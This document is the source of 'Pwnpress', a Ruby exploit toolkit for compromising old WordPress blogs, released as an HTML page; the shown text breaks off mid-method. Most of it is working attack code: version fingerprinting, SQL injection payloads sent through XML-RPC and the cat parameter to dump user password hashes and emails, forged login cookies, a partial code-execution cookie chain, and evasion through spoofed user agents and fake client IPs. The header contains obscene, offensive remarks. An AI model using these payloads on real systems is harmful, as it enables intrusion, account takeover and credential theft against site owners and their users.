<html><head><title>Wordpress Multiple Versions Pwnpress Exploitation Tookit (0.2pub)</title></head><pre>#!/usr/bin/env ruby
#                .---. .---.
#               :     : o   :    happy antiblogging, dear kids!
#           _..-:   0 :     :-.._    /
#       .-''  '  `---' `---' &quot;   ``-.         Copyright (c) Lance M. Havok
#     .'   &quot;   '  &quot;  .    &quot;  . '  &quot;  `.       &lt;lmh [at] info-pull.com&gt;
#    :   '.---.,,.,...,.,.,.,..---.  ' ;
#    `. &quot; `.                     .' &quot; .'      ----- All rights reserved.
#     `.  '`.   .-/|||||||\-.   .' ' .'       2006, 2007.
#      `.    `-._   \|||/   _.-' &quot;  .'
#        `. &quot;    '&quot;--...--&quot;'  . ' .'    ...because blogs are useless
#  jgs   .'`-._'    &quot; .     &quot; _.-'`.       self-promotion and mental
#      .'      ```--.....--'''    ' `:               masturbation...
#   &quot;The blogosphere end is fucking nigh!&quot;
#                                              -RELEASE LESS, RELEASE BEST-
# == Disclaimer and license
# This code is *NOT* GPL. Commercial usage is strictly forbidden (any activity
# directly or indirectly generating revenue: consulting, distribution in slides,
# mirroring in websites with ad/affiliate programs, advertise your web IDS, etc).
#
# == Pwnpress motivation and features
# Pwnpress implements multiple techniques, bugs and tricks for compromising
# Wordpress-based blogs, combining the exploits in the necessary order for
# retrieving any necessary information to make the exploitation process as
# reliable as possible. Because every time you 'blog', god mutilates the penis
# of a poor 12 year old Vietnamese boy.
#
# Covertness capability is provided, dynamically adapting the payloads and
# operations to lower potential 'noise' on the wire. Fingerprinting deploys few
# methods able to detect all versions of Wordpress in their default installation
# form without tampering of wp-includes/version.php
#
# Tested with Wordpress 2.2, 2.2.2, 2.0.5, 2.0.6, 2.1, (...), PHP/5.2.4 for
# Apache 2.0.58 on Gentoo GNU/Linux. magic_quotes on and off for the different
# exploits.
#
# == A short advice (for those who desperately need a working brain)
# Due to the recent incidents of people ripping some of our work at Blackhat and
# other *pointless* security conferences, we politely ask you to refrain from
# doing such a mean thing. If you can't be creative, find a different hobby.
# &quot;DANGER RABBI ROBINSON: INFOWAR!&quot; Gadi Evron, blogs.securiteam.com (WP 2.0.10)
# Trespassers expect career disruption and public humiliation... :)
#

require 'digest/md5'
require 'net/http'
require 'base64'
require 'irb'
require 'uri'

class Array
    # Return random item
    def rand_i
        return self[rand(self.size)]
    end
end

class String
    # http://snippets.dzone.com/posts/show/2111
    def self.rnd(size = 16)
        (1..size).collect { (i = Kernel.rand(62);
        i += ((i &lt; 10) ? 48 : ((i &lt; 36) ? 55 : 61 ))).chr }.join
    end
end

# Oh jesuschrist, here comes the pie!
class Pwnpress
    PWNPRESS_VERSION         = &quot;0.2pub&quot;
    LATEST_VERSION_SUPPORTED = &quot;2.2.2&quot;
    DEFAULT_TABLE_PREFIX     = &quot;wp&quot;
    KNOWN_REGEXPS            = {
        :meta_generator =&gt; /&lt;meta name=&quot;generator&quot; content=&quot;(.+?)&quot; \/&gt;/,
        :rss_feed_links =&gt;
            [
                /title=&quot;RSS 2.0&quot; href=&quot;(.*)&quot;/,
                /title=&quot;RSS .92&quot; href=&quot;(.*)&quot;/
                
            ],
        :atom_feed_links =&gt;
            [
                /title=&quot;Atom 0.3&quot; href=&quot;(.*)&quot;/
            ],
        :rss2_generator =&gt;
            [
                /&lt;generator&gt;http:\/\/wordpress.org\/?v=(.+?)&lt;\/generator&gt;/,
                /generator=&quot;(.+?)&quot;/
            ],
        :atom_generator =&gt;
            [
                /uri=&quot;http:\/\/wordpress.org\/&quot; version=&quot;(.+?)&quot;&gt;Word(P|p)ress/
                # This fixes dumb editors with stupid syntax highlighting :)&quot;
            ]
    }
    
    attr_reader :results
    
    # Initialize the instance variables, etc. Perform any required operations
    # to set the initial state ready.
    def initialize(options)
        unless options[:target] != nil
            raise &quot;Missing target URL parameter.&quot;
        end
        
        # Check for missing trailing slash, add if necessary
        if options[:target].split(//).last != '/'
            options[:target] &lt;&lt; '/'
        end
        
        
        @url          = URI.parse(options[:target])
        @proxy_host   = options[:proxy_host]
        @proxy_port   = options[:proxy_port]
        @table_prefix = options[:table_prefix]
        @username     = options[:username]
        @password     = options[:password]
        @covert_level = options[:covert_level]
        @results      = {}
        @finger_on    = options[:fingerprint]
        
        if options[:version] == &quot;auto&quot;
            @version = fingerprint_wordpress()
            if @version
                msg_name = &quot;Found Wordpress version.&quot;
                msg_desc = %Q{
                    Target has #{@version} installed. Current last
                    release (devel) is #{@wp_versions.last}. Known
                    versions: #{@wp_versions.size} (includes devel).
                }
                
                add_results_msg(:wp_version, :success, msg_name, msg_desc)
            else
                msg_name = &quot;Can't find Wordpress version.&quot;
                msg_desc = %Q{
                    Target has an unknown Wordpress version installed.
                    It might be fake or bogus. Please specify target
                    version yourself, since fingerprinting failed :(
                }
                
                add_results_msg(:wp_version, :failure, msg_name, msg_desc)
            end
        else
            fingerprint_wordpress(true)
            @version = options[:version]
        end
        
    end
    
    # Attempt to verify wordpress presence and installed version + patch level:
    #
    # 1. Default installation contains a META generator header.
    # 2. Default RSS/ATOM feed generation code also provides version information.
    # 3. Default template and most styles include &quot;Powered by&quot; text.
    #
    #     &lt;meta name=&quot;generator&quot; content=&quot;WordPress 2.2.2&quot; /&gt;
    #     &lt;!-- generator=&quot;wordpress/2.2.2&quot; --&gt;
    #     &lt;generator&gt;http://wordpress.org/?v=2.2.2&lt;/generator&gt;
    #     proudly powered by &lt;a href=&quot;http://wordpress.org/&quot;&gt;WordPress&lt;/a&gt;
    #     &lt;generator url=&quot;http://...org/&quot; version=&quot;1.5.2&quot;&gt;WordPress&lt;/generator&gt;
    #
    # The above methods can be fooled by simply editing wp-includes/version.php
    # Covert level affects what methods might be used, depending on how clumsy
    # the activity could be on the wire. Fingerprinting is highly effective in
    # most cases but there are still users who decide to fake version strings,
    # therefore a method using some heuristics is provided as well. Obviously it
    # can be fooled as easily, but helps to identify branch and feature sets.
    #
    # Methods involving extremely simple &quot;heuristics&quot;:
    #
    # 4. Detect the style and layout of the login interface.
    # 5. Detect files that are present only in certain revisions or branches.
    # 6. Detect plugins and themes or styles available only for some branches.
    #
    # This list isn't exhaustive, there are other potentially reliable
    # methods (depending on desired attack surface: default installation, custom
    # blogs, heavily modified code, etc). Ski ba bop ba dop bop!
    #
    def fingerprint_wordpress(only_retrieve_body = false)
        index_paths = [ &quot;index.php&quot;, &quot;?#comments&quot; ]
        rss2_paths  = [ &quot;?feed=rss2&quot;, &quot;?feed=comments-rss2&quot; ]
        atom_paths  = [ &quot;?feed=atom&quot;, &quot;?feed=comments-atom&quot; ]
        
        unless @body
            @body = retrieve_content(index_paths.rand_i)
            if @body == nil
                raise &quot;HTTP GET failed: wrong path or offline?&quot;
            end
        end
        
        if @body and only_retrieve_body == false and @finger_on
            get_valid_versions_array

            # Retrieve existing RSS and ATOM feed paths. Note that this will
            # only try to match for the target url. If Wordpress has set a
            # different base url, then these checks won't use it.
            KNOWN_REGEXPS[:rss_feed_links].each do |rp|
              tmp_array = @body.scan(rp).flatten
              tmp_array.each do |uri|
                rss2_paths &lt;&lt; uri.gsub(/#{@url.to_s}/,'')
              end
            end
            
            KNOWN_REGEXPS[:atom_feed_links].each do |rp|
              tmp_array = @body.scan(rp).flatten
              tmp_array.each do |uri|
                atom_paths &lt;&lt; uri.gsub(/#{@url.to_s}/,'')
              end
            end
            
            # Method 1
            meta_generator = @body.scan(KNOWN_REGEXPS[:meta_generator]).flatten
            if meta_generator
                wp_string = meta_generator[0].scan(/(.+?) (.*)/).flatten
                if wp_string.size ==  2
                    if wp_string[0] =~ /Word(p|P)ress/i
                        if wp_string[1]
                            # Verify version against those known to be valid
                            if @wp_versions.find { |v| v[0] == wp_string[1] }
                                return wp_string[1]
                            end
                        end
                    end
                end
            end
            
            # Note: could refactor these two as a method and save some lines,
            # but this is the only existing place where it would be used.
            # Method 2: RSS
            rss2 = get_meta_value(rss2_paths.rand_i, :rss2_generator)
            if rss2 and rss2[:str]
                ver = rss2[:str].scan(/(.*)\/(.*)/).flatten
                if ver and ver.size == 2
                    if @wp_versions.find { |v| v[0] == ver[1] }
                        return ver[1]
                    end
                end
            end
            
            # Method 2: ATOM
            atom = get_meta_value(atom_paths.rand_i, :atom_generator)
            if atom and atom[:str]
                if @wp_versions.find { |v| v[0] == atom[:str] }
                    return atom[:str]
                end
            end
            
            # Method 4: determine login box layout and/or style. works for
            # checking if the version is post 2.2 branch or older (pre 2.2).
            # Besides that, this isn't of much help.
            if @covert_level &lt; 1
                login_body = retrieve_content(&quot;wp-login.php&quot;)
                if login_body =~ /&lt;html xmlns=&quot;http:\/\/www.w3.org\/1999\/xhtml&quot; dir=&quot;ltr&quot;&gt;/
                    return &quot;post-2.2&quot;
                end
                if login_body =~ /&lt;html xmlns=&quot;http:\/\/www.w3.org\/1999\/xhtml&quot;&gt;/
                    return &quot;pre-2.2&quot;
                end
            end
            
            # Method 5: branch-persistent files
            if @covert_level &lt; 1
                # wp-app.php and wp-cron.php are from old 1.5 branch
                if retrieve_content(&quot;wp-app.php&quot;, @url, nil, true).code == &quot;404&quot;
                    return &quot;likely-2.2&quot;
                else
                    return &quot;likely-1.5&quot;
                end
            end
            
            # Method 3: final, we return nil since we really cant tell an exact
            # version.
            if @body =~ /(proudly powered by|Powered by) &lt;a href=(.*)wordpress(.*)&gt;/
                return nil
            end
        end
    end
    
    # A brilliant bug fixed after 2.2(.0) which was exploitable by least
    # privileged users (ex. Subscribers) via the XML-RPC interface:
    #
    #   function wp_suggestCategories($args) {
    #   ...
    #       $this-&gt;escape($args);
    #       $blog_id                = (int) $args[0];
    #       ...
    #       $max_results            = $args[4];           !! where's mr. (int)?
    #       ...
    #       if(!empty($max_results)) {
    #           $limit = &quot;LIMIT {$max_results}&quot;;          !! :&gt;
    #
    #     $category_suggestions = $wpdb-&gt;get_results(&quot;    !! &quot;I see dead SQL :(&quot;
    #       SELECT cat_ID category_id,
    #           cat_name category_name
    #       FROM {$wpdb-&gt;categories}
    #       WHERE cat_name LIKE '{$category}%'
    #       {$limit}                                      !! kekekekekekeKEKEKE!
    #       &quot;);
    #
    #   return($category_suggestions);
    #
    # Fixed in later revisions (ex. 2.2.2). The bug was reported to the Wordpress
    # development team by Alex C, with a .NET C# proof of concept.
    #
    def exploit_220_suggestCategories_xmlrpc
        if @username and  @password
            user_list    = {}
            xmlrpc_path  = get_xmlrpc_path()
            xml_payload  =  &quot;&lt;methodCall&gt;\n&quot;                                   +
                            &quot;\t&lt;methodName&gt;wp.suggestCategories&lt;/methodName&gt;\n&quot;+
                            &quot;\t&lt;params&gt;\n&quot;                                     +
                            &quot;\t\t&lt;param&gt;&lt;value&gt;1&lt;/value&gt;&lt;/param&gt;\n&quot;            +
                            &quot;\t\t&lt;param&gt;&lt;value&gt;#{@username}&lt;/value&gt;&lt;/param&gt;\n&quot; +
                            &quot;\t\t&lt;param&gt;&lt;value&gt;#{@password}&lt;/value&gt;&lt;/param&gt;\n&quot; +
                            &quot;\t\t&lt;param&gt;&lt;value&gt;1&lt;/value&gt;&lt;/param&gt;\n&quot;            +
                            &quot;\t\t&lt;param&gt;&lt;value&gt;&quot;                               +
                            &quot;0 UNION ALL SELECT user_login, user_pass FROM &quot;   +
                            &quot;WPR3F1X_users&quot;                                    +
                            &quot;&lt;/value&gt;&lt;/param&gt;\n&quot;                               +
                            &quot;\t&lt;/params&gt;\n&quot;                                    +
                            &quot;&lt;/methodCall&gt;\n&quot;
           
           # Send the query
           if xmlrpc_path
               get_table_prefix()
               
               res = send_xmlrpc(xml_payload.gsub(/WPR3F1X/, @table_prefix),
                                 xmlrpc_path)
               if res =~ /Word(P|p)ress database error/ and @covert_level &lt; 1
                   # Try to guess prefix again if we had an error
                   get_table_prefix(:db_error, res)
                   res = send_xmlrpc(xml_payload.gsub(/WPR3F1X/, @table_prefix),
                                     xmlrpc_path)
               end
               
               # No need for a full-blown XML parser. Ruby is *that* nice :&gt;
               if res =~ /&lt;member&gt;&lt;name&gt;category_id&lt;\/name&gt;&lt;value&gt;&lt;string&gt;/
                   regex = /&lt;member&gt;&lt;name&gt;(.+?)&lt;\/name&gt;&lt;value&gt;&lt;string&gt;(.+?)&lt;\/string&gt;&lt;\/value&gt;&lt;\/member&gt;/
                   credentials = res.scan(regex)
                   last_user = nil
                   
                   credentials.each do |a|
                      if a[0] == &quot;category_id&quot; and a[1]
                          user_list[a[1]] = { :passwd_hash =&gt; nil }
                          last_user = a[1]
                      end
                      if a[0] == &quot;category_name&quot; and a[1]
                          user_list[last_user][:passwd_hash] = a[1]
                          cookie = get_cookie_hash(last_user, a[1])
                          if cookie and cookie.size == 2
                              user_list[last_user][:cookie_user] = cookie[0]
                              user_list[last_user][:cookie_pass] = cookie[1]
                          end
                      end
                   end
                   
                   add_to_results(:sql_injection_xmlrpc_220, :user_hashes,
                                  user_list)
                   return true
               end
               
               # Did not work :(
               return false
           end
        else
            raise &quot;Username and password required for XML-RPC injection in 2.2&quot;
        end
    end
    
    # Nice pre-authentication bug found by different individuals, one of them my
    # appreciated fellow Jesus H. Christ who coded a rather dirty proof of concept
    # doing the job just fine, with magic_quotes = Off. This is a cleaner version
    # with few extra checks. Like the original Perl version, uses base64 to avoid
    # char filtering woes and as a side-effect (bonus!) for mod_security evasion
    # :&gt; (thanks to XML-RPC handling, which supports base64 encoded elements).
    #
    def exploit_222_pingback_xmlrpc
        user_list = {}
        tags_list = []
        xmlrpc_path  = get_xmlrpc_path()
        
        get_table_prefix()
        
        # First we need to scan for some tags (categories), this is most likely
        # 100% reliable if rewrite rules are enabled and theme is Wordpress
        # compliant (or follows the usual scheme).
        tags_list = get_existing_tags()
        unless tags_list.size &gt; 0
            msgs = { :failure =&gt; { :response =&gt; &quot;Can't find suitable tag.&quot; } }
            msgs[:failure][:description] = %Q{
                \t A suitable permalink-style path is required for the exploit
                \t to be successful. Failure to find this parameter indicates
                \t that most probably the target is not using URL rewrite rules.
                \t The bug does not trigger with &quot;emulated&quot; index.php/ style
                \t paths.
            }
            
            add_to_results(:sql_injection_xmlrpc_222, :messages, msgs)
            return false
        end
        
        sql_query =  tags_list.rand_i[:link]
        sql_query &lt;&lt; &quot;#{String.rnd}&amp;post_type=#{String.rnd}\%27)&quot;
        sql_query &lt;&lt; &quot; UNION SELECT CONCAT(user_pass, \%27 - \%27, user_login,&quot;
        sql_query &lt;&lt; &quot; \%27 - \%27, user_email), 2,3,4,5,6,7,8,9,10,11,12,13,&quot;
        sql_query &lt;&lt; &quot;14,15,16,17,18,19,20,21,22,23,24 FROM &quot;
        sql_query &lt;&lt; &quot;WPR3F1X_users\%2F*&quot;
        
        xml_payload  =  &quot;&lt;?xml version=\&quot;1.0\&quot;?&gt;\n&quot;                           +
                        &quot;&lt;methodCall&gt;\n\t&lt;methodName&gt;&quot;                        +
                        &quot;pingback.extensions.getPingbacks&quot;                    +
                        &quot;&lt;/methodName&gt;\n&quot;                                     +
                        &quot;\t&lt;base64&gt;INJ_SQL_QUERY&lt;/base64&gt;\n&quot;                  +
                        &quot;&lt;/methodCall&gt;\n&quot;
       
        # Send the query
        if xmlrpc_path
            tmp = sql_query.gsub(/WPR3F1X/, @table_prefix)
            tmp = xml_payload.gsub(/INJ_SQL_QUERY/, Base64.encode64(tmp))
            res = send_xmlrpc(tmp, xmlrpc_path)
            
            if res =~ /Word(P|p)ress database error/ and @covert_level &lt; 1
                # Try to guess prefix again if we had an error
                get_table_prefix(:db_error, res)
                tmp = sql_query.gsub(/WPR3F1X/, @table_prefix)
                tmp = xml_payload.gsub(/INJ_SQL_QUERY/, Base64.encode64(tmp))
                res = send_xmlrpc(tmp, xmlrpc_path)
            end
            
            wpuser_blob = res.scan(/WHERE post_id IN \((.*?)\)/s).flatten[0]
            credentials = wpuser_blob.scan(/([a-z0-9]{32}) \- (.*?) \- ([^,]+)/i)
            credentials.each do |a|
                password_hash = a[0]
                poor_username = a[1]
                email_address = a[2]
                
                user_list[poor_username] = {
                    :email_addr  =&gt; email_address,
                    :passwd_hash =&gt; password_hash
                }
                
                cookie = get_cookie_hash(poor_username, password_hash)
                if cookie and cookie.size == 2
                    user_list[poor_username][:cookie_user] = cookie[0]
                    user_list[poor_username][:cookie_pass] = cookie[1]
                end
            end
            
            add_to_results(:sql_injection_xmlrpc_222, :user_hashes, user_list)
            return true
        end
        
        return false
    end

    # One of the most sloppy, unreliable and awkward exploits ever released for
    # Wordpress. The original exploit from Stefan Esser was mediocre at best.
    # No offense meant, it was just a seriously deficient piece of horse shit.
    def exploit_205_trackback_utf7
        wpuser_list = {}
        sql_query = &quot;&quot;
        # Left to be implemented someday...
    end
    
    # Present in 1.5.1.1, this one allows dead easy SQL injection (ex. via cat
    # variable, for category, in the index page right away). The SQL query here
    # is loosely based on the original exploit by Alberto Trivero, with extra
    # output. Also, we support multiple user dumping by limiting the query per
    # id, and iterating randomly if covert level allows it (since we are doing
    # a GET request, as clumsy as cmd.exe at packages.gentoo.org :&gt;).
    def exploit_1511_catsqlinjection
        user_list = {}
        
        sql_query = &quot;#{rand(40)} UNION SELECT NULL,CONCAT(CHAR(58),user_pass,&quot;
        sql_query &lt;&lt; &quot;CHAR(58),user_email,CHAR(58),user_login,CHAR(58)),2,&quot;
        sql_query &lt;&lt; &quot;NULL,NULL FROM WPR3F1X_users WHERE id = TUSER/*&quot;

        
        get_table_prefix()
        
        if @covert_level &gt; 1
            iterations = 1
        else
            iterations = rand(20)+1
        end
        
        user_id = 1
        iterations.times do
            tmp = sql_query.gsub(/TUSER/, user_id.to_s)
            tmp = URI.encode(tmp.gsub(/WPR3F1X/, @table_prefix))
            
            res = retrieve_content(&quot;?cat=#{tmp}&quot;)
            if res =~ /Word(P|p)ress database error/ and @covert_level &lt; 1
                    get_table_prefix(:db_error, res)
                    tmp = sql_query.gsub(/TUSER/, user_id.to_s)
                    tmp = URI.encode(tmp.gsub(/WPR3F1X/, @table_prefix))
                    res = retrieve_content(&quot;?cat=#{tmp}&quot;)
            end
            
            if res
                val = res.scan(/:([a-z0-9]{32}):(.*?):(.*?): category/).flatten
                if val.size == 3
                    user_list[val[2]] = {
                        :email_addr  =&gt; val[1],
                        :passwd_hash =&gt; val[0]
                    }
                    
                    cookie = get_cookie_hash(val[2], val[0])
                    if cookie and cookie.size == 2
                        user_list[val[2]][:cookie_user] = cookie[0]
                        user_list[val[2]][:cookie_pass] = cookie[1]
                    end
                end
            end
            
            user_id += 1
        end
        
        if user_list.size &gt; 0
            add_to_results(:sql_injection_cat_1513, :user_hashes, user_list)
            return true
        else
            return false
        end
    end
    
    # A code execution flaw in 1.5.1.3 when register_globals is enabled. Allows
    # simple exploitation via variables overwrite. The technique is based on
    # the original exploit by Kartoffelguru, using a base64 encoded command.
    def exploit_1513_codeexec
        cookie_template = &quot;wp_filter[query_vars][0][0][function]=get_lastpostdate;&quot;
        cookie_template &lt;&lt; &quot;wp_filter[query_vars][0][0][accepted_args]=0;&quot;
        cookie_template &lt;&lt; &quot;wp_filter[query_vars][0][1][function]=base64_decode;&quot;
        cookie_template &lt;&lt; &quot;wp_filter[query_vars][0][1][accepted_args]=1;&quot;
        cookie_template &lt;&lt; &quot;cache_lastpostmodified[server]=//e;&quot;
        cookie_template &lt;&lt; &quot;cache_lastpostdate[server]=BASE64CMD;&quot;
        cookie_template &lt;&lt; &quot;wp_filter[query_vars][1][0][function]=parse_str;&quot;
        cookie_template &lt;&lt; &quot;wp_filter[query_vars][1][0][accepted_args]=1;&quot;
        cookie_template &lt;&lt; &quot;wp_filter[query_vars][2][0][function]=get_lastpostmodified;&quot;
        cookie_template &lt;&lt; &quot;wp_filter[query_vars][2][0][accepted_args]=0;&quot;
        cookie_template &lt;&lt; &quot;wp_filter[query_vars][3][0][function]=preg_replace;&quot;
        cookie_template &lt;&lt; &quot;wp_filter[query_vars][3][0][accepted_args]=3;&quot;
        
        # $code = base64_encode($cmd);
        # $cnv = &quot;&quot;;
        # for ($i=0;$i&lt;strlen($code); $i++) {
        # $cnv.= &quot;chr(&quot;.ord($code[$i]).&quot;).&quot;;
        # }
        # $cnv.=&quot;chr(32)&quot;;
        # $str = base64_encode('args[0]=eval(base64_decode('.$cnv.')).die()&amp;args[1]=x');

        #cmd = Base64.encode64(cmd).scan(/.{1,600}/o).to_s
        #tmp = cookie_template.gsub(/BASE64CMD/, cmd)
        # TODO :)
    end
    
    # Determine what exploits could work against the target version. Chain them
    # inside an array and then sequentially execute the methods. These are
    # ordered depending on the reliability, and used according to the desired
    # covert level.
    def exploit
        @ammunition = []
        
        case @version
            when &quot;1.5.1.1&quot;
                # pre-auth
                @ammunition &lt;&lt; exploit_1511_catsqlinjection
            when &quot;1.5.1.3&quot;
                # pre-auth, classic code exec right away.
                @ammunition &lt;&lt; exploit_1513_codeexec
            when &quot;2.0.5&quot;
                # pre-auth. esser's exploit was really weak for this one :)
                @ammunition &lt;&lt; exploit_205_trackback_utf7
            when &quot;2.1.3&quot;
            when &quot;2.2&quot;
                # combo :&gt; (pre-auth + post-auth, pick twice)
                @ammunition &lt;&lt; exploit_220_suggestCategories_xmlrpc
                @ammunition &lt;&lt; exploit_222_pingback_xmlrpc
            when &quot;2.2.2&quot;
                # pre-auth
                @ammunition &lt;&lt; exploit_222_pingback_xmlrpc
            else
                return false
        end
        
        # What would Jesus do?
        @ammunition.each do |headshot|
            headshot
        end
    end
    
    # Retrieve the site hash using a HEAD request, taking username and password
    # hash for filling a valid cookie which can be used to operate the target
    # account without requiring the password. This can be set in Firefox by
    # editing the cookies.txt file or using the proper extension providing cookie
    # editing functionality. Uses random headers.
    def get_cookie_hash(username, phash)
        login_path = @url.path + &quot;wp-login.php?action=logout&quot;
        phash      = Digest::MD5.new().hexdigest(phash)
        cookie     = &quot;wordpressuser_CHH=#{username};wordpresspass_CHH=#{phash}&quot;
        
        unless @site_cookie_hash
            res = Net::HTTP::Proxy(@proxy_host, @proxy_port).start(@url.host,
                                   @url.port) { |http|
                res = http.head(login_path, self.random_headers)
                if res and res[&quot;set-cookie&quot;]
                    c = res[&quot;set-cookie&quot;].scan(/wordpressuser_(.+?)=/).flatten[0]
                    if c.length == 32
                        @site_cookie_hash = c
                    else
                        return nil
                    end
                end
            }
        end
        
        cookie.gsub!(/CHH/, @site_cookie_hash)
        return cookie = cookie.split(/;/)
    end
    
    # Retrieve categories (tags) from the Wordpress content. This is used by
    # those SQL injection exploits that rely on valid permalinks or other types
    # of &quot;standard&quot; blog elements referring to internal content.
    def get_existing_tags()
        tag_list = []
        
        arr = @body.scan(/&lt;a href=&quot;(.+?)&quot; title=&quot;View all posts in (.+?)&quot; rel=&quot;category tag&quot;&gt;/)
        if arr and arr.size &gt; 0
            i = 0
            arr.each do |link, tag|
                if tag and link
                    # link could be null, not an issue
                    tag_list[i] = { :tag =&gt; tag, :link =&gt; link }
                    i += 1
                end
            end
        end
        
        return tag_list
    end
    
    
    # Attempt to guess the table prefix. If no known methods / information
    # disclosure bugs worked, use the default setting (wp or wp_svn for devel
    # builds).
    #
    # For now, methods available:
    # a) :db_error = scan input string for SQl error leaking wordpress prefix
    # b) :db_error + 2.2.{1,0} edit-comments.php apage parameter bug
    #    requires enough privileges, leads to a SQL error with negative value
    #    at apage parameter, leaking the wordpress tables pefix:
    #       WordPress database error: ... SELECT SQL_CALC_FOUND_ROWS * FROM
    #       wp_comments WHERE comment_approved = '0' OR comment_approved = '1'
    #       ORDER BY comment_date DESC LIMIT -40, 25
    #
    def get_table_prefix(method = nil, str = nil)
        if method and str
            case method
                when :db_error
                     regex = /FROM (.+?)_(categories|users|posts|links|comments)/
                     new_prefix = str.scan(regex).flatten
                     if new_prefix.size == 1
                         @table_prefix = new_prefix[0]
                     end
                when :edit_coms_221
                     # Not implemented since it requires edit privileges.
                     # db_error method suffices almost always.
                else
                    @table_prefix = DEFAULT_TABLE_PREFIX
            end
        else
            # Nothing worked, let's just guess it's default
            @table_prefix = DEFAULT_TABLE_PREFIX
        end
    end
    
    # Attempt to guess the correct xmlrpc.php path relative to base directory.
    # Most rewrite rules never bother changing this, therefore it shouldn't be
    # necessary to mess with this method. Add new checks if necessary.
    def get_xmlrpc_path()
        unless @xmlrpc_location 
            meta_regexp = /&lt;link rel=&quot;pingback&quot; href=&quot;(.*)\/(.*)&quot; \/&gt;/
            pingback = @body.scan(meta_regexp).flatten
            if pingback.size == 2
                meta_url = URI.parse(pingback[0])
                
                # Verify URL belongs to target host. Disable this if necessary. 
                if meta_url.host == @url.host
                    @xmlrpc_location = pingback[1]
                end
            else
                if remote_file_exists(@url.path + &quot;xmlrpc.php&quot;)
                    @xmlrpc_location = &quot;xmlrpc.php&quot;
                else
                    # Nothing worked so far, out of luck.
                    return nil
                end 
            end
        end
        
        return @xmlrpc_location
    end
    
    #
    # Helpers and other utilities.
    #
    
    # Get the meta value of content found at path, using specified regexp
    # from the KNOWN_REGEXPS constant (by default)
    def get_meta_value(path, regexp, kregexp = KNOWN_REGEXPS)
        result = nil
        
        txt = retrieve_content(path)
        if txt
            kregexp[regexp].each do |rp|
              mvalue = txt.scan(rp).flatten[0]
              if mvalue
                result = { :str =&gt; mvalue, :buf =&gt; txt }
              end
            end
        end
        
        return result
    end
    
    # Add data to the results variable, available for read access to check
    # for information retrieved from successful exploitation.
    def add_to_results(bug, data_type, array)
        @results[bug] = { :data_type =&gt; data_type, :data =&gt; array}
    end
    
    # Add a message of given importance and desired information to the results
    # hash.
    def add_results_msg(owner, level, name, value)
        new_message = { level =&gt; { :response =&gt; name } }
        new_message[level][:description] = value
        add_to_results(owner, :messages, new_message)
    end
    
    # :nodoc: &quot;Better than Nikto GET storm!&quot; - a CISSP realizing HEAD exists.
    # Uses a HEAD request to check existence of a remote file. Uses random
    # headers.
    def remote_file_exists(path)
        does_exist = nil
        
        res = Net::HTTP::Proxy(@proxy_host, @proxy_port).start(@url.host,
                               @url.port) { |http|
           res = http.head(path, self.random_headers)
           case res
               when Net::HTTPSuccess, Net::HTTPRedirection
                   does_exist = true
               else
                   does_exist = false
           end
        }
        
        return does_exist
    end
    
    # Return a random User-Agent string from an array of the most popular ones :-)
    # (updated, August 2007). Do not add unusual/uncommon agents that stand out.
    def self.random_agent
        available_useragents = [
            &quot;Googlebot/2.1 ( http://www.google.com/bot.html)&quot;,
            &quot;msnbot/1.0 (+http://search.msn.com/msnbot.htm)&quot;,
            &quot;Mozilla/5.0 (X11; U; Linux x86; en-US; rv:1.8.1.6) Gecko/20061201 Firefox/2.0.0.6 (Ubuntu-feisty)&quot;,
            &quot;Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6&quot;,
            &quot;Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0)&quot;,
            &quot;Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)&quot;,
            &quot;Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)&quot;,
            &quot;Mozilla/5.0 (Windows; U; Windows NT 6.0; en) AppleWebKit/522.15.5 (KHTML, like Gecko) Version/3.0.3 Safari/522.15.5&quot;,
            &quot;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/522.11.1 (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1&quot;,
            &quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/523.2+ (KHTML, like Gecko) Version/3.0.3 Safari/522.12.1&quot;,
            &quot;Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.7.5) Gecko/20070321 Netscape/8.1.3&quot;,
            &quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20070321 Netscape/9.0&quot;,
            &quot;Opera/9.23 (Windows NT 5.0; U; en)&quot;
        ]
        
        return available_useragents.rand_i
    end
    
    # Random IP address generator, this is used for generation of PC_REMOTE_ADDR
    # headers, since we want to leave a fake REMOTE_ADDR in the database record:
    # From Wordpress 2.2.2, wp-includes/vars.php (line 39):
    # 
    #  if ( isset($_SERVER['HTTP_PC_REMOTE_ADDR']) )
    #     $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_PC_REMOTE_ADDR'];
    #
    # Optional argument determines the first block to use (ex. 17 = Apple :&gt;)
    def self.random_ip(first_block = rand(254))
        return &quot;#{first_block}.#{rand(254)}.#{rand(254)}.#{rand(254)}&quot;
    end
    
    # Simply scans the body content for &lt;a&gt; elements and returns an array of
    # links. Useful for Referer spoofing, disguising as a normal visitor.
    def get_site_pages
        if @body
            return @body.scan(/&lt;a href=&quot;(.*)&quot;/).flatten
        else
            return nil
        end
    end
    
    # Return a hash of HTTP headers generated randomly. The goal is generating
    # non-homogeneous requests that contain static patterns.
    def random_headers
        rndheader = {}
        languages = [ &quot;de-DE,en;q=0.5&quot;, &quot;en-us,en;q=0.5&quot;, &quot;en&quot;, &quot;zh, en-us; q=0.6&quot; ]
        rel_pages = get_site_pages()

        rndheader[&quot;User-Agent&quot;]      = Pwnpress.random_agent
        rndheader[&quot;Accept-Language&quot;] = languages.rand_i
        if rel_pages
            rndheader[&quot;Referer&quot;]    = rel_pages.rand_i
        end
        
        # Spoof REMOTE_ADDR, while this might be &quot;covert&quot; backend-wise, normal
        # headers would *never* contain this. this shouldn't work on OS X server
        # since the variable would be set server-side already. oh wait, I just
        # helped IDS vendors! :&gt;
        if @covert_level &gt; 1
            rndheader[&quot;PC_REMOTE_ADDR&quot;] = Pwnpress.random_ip
        end
        
        return rndheader
    end
    
    # Retrieve a list of all existing Wordpress versions from wordpress.org.
    # Returns array with the results.
    def get_valid_versions_array
        unless @wp_versions
            regexp = /&lt;td align='center'&gt;&lt;a href='(.+?)'&gt;zip&lt;\/a&gt;&lt;\/td&gt;/
